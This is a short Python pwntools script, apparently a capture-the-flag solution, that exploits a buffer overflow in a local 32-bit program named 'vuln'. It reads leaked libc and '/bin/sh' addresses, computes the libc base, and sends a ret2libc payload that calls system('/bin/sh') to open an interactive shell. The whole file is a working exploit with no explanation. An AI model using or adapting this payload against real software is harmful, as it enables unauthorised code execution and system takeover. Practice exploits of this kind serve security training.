from pwn import *

libc = ELF('/lib32/libc.so.6')

r = process('./vuln')

r.recvuntil('puts: ')
LIBC_BASE = int(r.recvline(), 16) - libc.symbols['puts']

r.recvuntil('useful_string: ')
BIN_SH = int(r.recvline(), 16)

r.recvuntil('Enter a string:')
r.sendline('A' * 0xa0 + p32(LIBC_BASE + libc.symbols['system']) + 'A' * 4 + p32(BIN_SH))

r.interactive()
